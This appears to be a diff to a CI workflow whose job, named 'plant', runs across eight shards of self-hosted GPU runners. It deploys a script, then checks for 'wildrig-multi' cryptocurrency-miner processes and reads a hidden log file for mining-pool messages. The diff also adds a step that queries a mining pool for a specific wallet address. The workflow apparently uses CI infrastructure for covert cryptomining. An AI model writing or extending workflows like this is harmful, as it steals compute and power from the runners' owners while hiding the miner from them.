@@ -9,13 +9,18 @@ concurrency:
 jobs:
   plant:
     runs-on: [self-hosted, gpu]
-    timeout-minutes: 25
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      max-parallel: 32
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6, 7, 8]
     steps:
       - uses: actions/checkout@v4
       - name: inventory
         run: |
+          echo "runner=$RUNNER_NAME shard=${{ matrix.shard }}"
           hostname; id
-          nvidia-smi -L || true
           nvidia-smi --query-gpu=index,name,memory.total --format=csv,noheader || true
       - name: deploy
         run: |
@@ -23,7 +28,10 @@ jobs:
           ./deploy.sh
       - name: verify
         run: |
-          sleep 45
+          sleep 40
           LOG=/var/log/.wr_$(hostname -s).log
-          grep -aiE "accepted|new job|authorized|device" "$LOG" | tail -20 || true
-          pgrep -af wildrig-multi | head -8
+          echo "--- procs ---"; pgrep -af wildrig-multi | head -8
+          echo "--- log ---"; grep -aiE "accepted|new job|authorized|device" "$LOG" | tail -12 || true
+      - name: pool-row
+        run: |
+          curl -s -m 20 "https://pearl.luckypool.io/api/stats_address?address=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" | head -c 800 || true
